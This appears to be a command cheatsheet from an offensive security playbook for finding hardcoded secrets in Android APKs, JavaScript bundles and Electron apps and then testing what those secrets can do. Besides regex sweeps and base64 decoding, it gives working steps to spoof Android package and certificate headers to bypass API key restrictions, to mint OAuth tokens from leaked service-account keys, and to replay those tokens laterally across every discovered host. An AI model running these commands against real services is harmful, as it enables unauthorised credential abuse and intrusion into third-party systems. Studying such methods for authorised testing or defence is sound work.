# Secrets Recovery Cheatsheet: sweep patterns, classification, capability matrix, version bisection

Command set for playbook class 1 (hardcoded secrets) across APK, JS, Electron asar, and config-plane sources. Every hit is a LEAD until the capability matrix runs; "valid key" appears nowhere in any output.

## 1. The sweep patterns (per corpus)

```bash
# universal regex battery (run over every string dump):
grep -nE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' extracted/allstrings.txt
grep -nE 'eyJ[A-Za-z0-9_-]{25,}\.[A-Za-z0-9_-]{10,}' extracted/allstrings.txt
grep -nE 'BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY' extracted/allstrings.txt
grep -nE 'Authorization: Basic [A-Za-z0-9+/=]{16,}' extracted/allstrings.txt
grep -niE 'client_secret|clientSecret' decoded/jadx-out/ | head -20
grep -niE 'sk_live_|pk_live_|rh_live_|whsec_' extracted/allstrings.txt
grep -nE 'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_' extracted/allstrings.txt
grep -nE 'xox[baprs]-' extracted/allstrings.txt
grep -niE 'api[_-]?key.?[:=].?["'"'"'][A-Za-z0-9_-]{16,}' extracted/allstrings.txt
# Firebase config block (the whole google-services.json / app.config):
cat decoded/apktool/res/raw/*.json 2>/dev/null; cat decoded/apktool/assets/*.json 2>/dev/null | head -40
# JS corpus + source maps:
grep -rnoE 'sourceMappingURL=[^ ]+' js-corpus/ | head
grep -rniE 'apiKey|api_key|secret|token' js-corpus/*.map 2>/dev/null | grep -v node_modules | head -20
# Electron asar (60-second extract, first-class surface):
npx @electron/asar extract app.asar asar-out/
grep -niE 'firebaseConfig|apiKey|databaseURL|projectId' asar-out/*.js | head -20
# push-stack patterns (push-notifications.md section 1):
grep -niE 'fcm.googleapis|onesignal|app_id.?[:=]|master.?secret|REST' extracted/allstrings.txt | head
```

## 2. Decode base64 candidates immediately

```bash
for blob in $(grep -oE '[A-Za-z0-9+/=]{24,}' extracted/allstrings.txt | sort -u | head -40); do
  d=$(echo "$blob" | base64 -d 2>/dev/null | tr -d '\0' | head -c 60)
  echo "$blob -> $d" | grep -iE 'http|key|secret|token|{"' | head -3
done
# basic-auth blob = client:secret pair:
echo '<BASIC-BLOB>' | base64 -d
# int-array secrets (Dart pools):
python3 -c "arr=<INT-ARRAY>; print(bytes(bytearray([v & 0xFF for v in arr])).hex())"
```

## 3. Localize precisely (file:line is report material)

```bash
# APK: jadx for the class, apktool smali for the byte-exact fallback:
grep -rn 'AUTH_TOKEN\|BuildConfig' decoded/jadx-out/sources/*/BuildConfig.java 2>/dev/null | head
grep -rn '@Headers' decoded/jadx-out/ | head -10
# BuildConfig fields:
find decoded/jadx-out -name 'BuildConfig.java' | xargs grep -nE 'String [A-Z_]+ = "' | head -20
# web: map back through the .map sourcesContent:
python3 -c "import json; m=json.load(open('app.js.map')); [print(i, s) for i, s in enumerate(m['sources']) if 'config' in s or 'auth' in s.lower()]" | head
```

## 4. Classify the secret (class determines the ladder)

| Marker shape | Class | Ladder |
|---|---|---|
| AIza (near oauth/googleapi usage) | Google API key | firebase.md 4 (restriction spoof) + firebase.md 1 (RC) |
| AIza (near fcm.googleapis) | FCM legacy server key | push.md 2 (own-token send) |
| full JSON with private_key | GCP service account | firebase.md 6 (mint + matrix) |
| AKIA/ASIA | AWS key | http.md + cloud-storage.md (sts caller identity, list, matrix) |
| eyJ... | JWT | jwt-oauth.md (decode, crack, forge) |
| client_secret + client_id | OAuth pair | jwt-oauth.md 9 (client_credentials mint) |
| Basic blob | embedded pair | decode + jwt-oauth.md 9 |
| BEGIN PRIVATE KEY | raw private key | header probe: openssl rsa -in key.pem -noout -modulus |
| sk_live/whsec | payment processor | one harmless call class per capability, never charge |
| ghp_/xox | GitHub / Slack | verification.md GitHub ladder / one harmless read call |
| vendor REST + app_id | push/analytics vendor | push.md 5 (send + read APIs) |

## 5. The capability matrix (the deliverable, never skip)

```bash
# one real call per CAN, one 403 per CANNOT, all through rh_capture:
python3 bin/rh_capture.py <target> <slug> GET 'https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key=<KEY>' --tag maps_naked
python3 bin/rh_capture.py <target> <slug> GET 'https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key=<KEY>' \
  --header 'X-Android-Package: <PKG>' --header 'X-Android-Cert: <RAWHEX>' --tag maps_spoofed
python3 bin/rh_capture.py <target> <slug> POST 'https://oauth2.googleapis.com/token' \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=<JWT>' --tag sa_mint
# lateral replay across EVERY discovered host (the 401s bound the blast radius, the 200s are the story):
while read h; do
  python3 bin/rh_capture.py <target> <slug> GET "https://$h/api/v1/me" --header "Authorization: Bearer <MINTED>" --tag lateral_$h 2>/dev/null
done < extracted/hosts.txt
```

Matrix rows: capability, endpoint, result, transcript. "Valid key" is not a finding; "key reads 12 partner credentials" is.

## 6. Version bisection (the no-rotation window)

```bash
# 1. acquire 2-3 historical builds (mirror website /version pages; apkcombo fallback when CF-walled):
python3 tools/apkpure/apkpure_dl/cli.py <PACKAGE>            # current
# old builds: walk the CDN HEAD redirects (versionCode probing, ~0.8s pacing):
for vc in <N> $((<N>-1)) $((<N>-5)); do
  curl -sI "https://d.apkpure.net/b/XAPK/<PACKAGE>?versionCode=$vc" | grep -i 'location' | head -1
done
# 2. same-signer check BEFORE diffing (androguard on each build):
python3 - <<'EOF'
from androguard.core.apk import APK
import hashlib
for p in ["old.apk", "current.apk"]:
    a = APK(p)
    certs = a.get_certificates_der_v3() or a.get_certificates_der_v2() or [a.get_certificate_der()]
    print(p, a.get_package(), hashlib.sha1(certs[0]).hexdigest()[:16])
EOF
# 3. marker matrix: byte-exact presence checks across builds (UTF-16 check for resources):
python3 - <<'EOF'
markers = [b"AIza<CANDIDATE-1>", b"<KEY-MARKER-2>", b"clientSecret-value", b"BEGIN PRIVATE KEY"]
import zipfile, re
for p in ["old.apk", "mid.apk", "current.apk"]:
    data = open(p, "rb").read()
    print(p, {m[:12].decode(errors="ignore"): (m in data) for m in markers})
EOF
# byte-identical markers across versions = MEASURED no-rotation window ("public and unrotated since >= <oldest>")
# absent in the oldest build = positive control (the pipeline CAN ship without it)
```

## 7. Config-plane sources (beyond the binary)

```bash
# Firebase Remote Config dump (the credential channel, firebase.md 1):
# RC entries carrying credentials count as secret hits for section 4/5
# embedded .env / app.config / manifest extras:
grep -rniE 'password|secret|key' decoded/apktool/assets/ decoded/apktool/res/raw/ 2>/dev/null | head -20
# protobuf descriptors and JSON blobs in assets:
find decoded/apktool/assets -name '*.json' -o -name '*.env' -o -name '*.txt' | head -10
# unauthenticated /api/config endpoints (the web twin):
curl -s 'https://<TARGET>/api/config' | head -c 300; echo
curl -s 'https://<TARGET>/config.json' | head -c 300; echo
```

## 8. FP-trap quick tests (before claiming any hit)

```bash
# public-by-design Firebase web config: still matrix it, restrictions fail more often than they hold
# demo-bundle keys: prove the project id linkage before claiming:
python3 - <<'EOF'
from curl_cffi import requests
r = requests.post("https://androidbuild.googleapis.com/v2/builds?filter=build_status=COMPLETED",
                  json={}, headers={"X-Android-Package": "<DEMO-PKG>"})  # 401 shape separates projects
EOF
# client-identifier-only (no capabilities, even spoofed): honest note, not a finding
# test/staging keys in prod builds: check WHICH environment accepts them first:
for h in stg-api.<TARGET> api.<TARGET>; do
  printf '%s -> ' "$h"
  curl -s -o /dev/null -w '%{http_code}\n' "https://$h/v1/ping" -H 'Authorization: Bearer <CANDIDATE-TOKEN>'
done
```
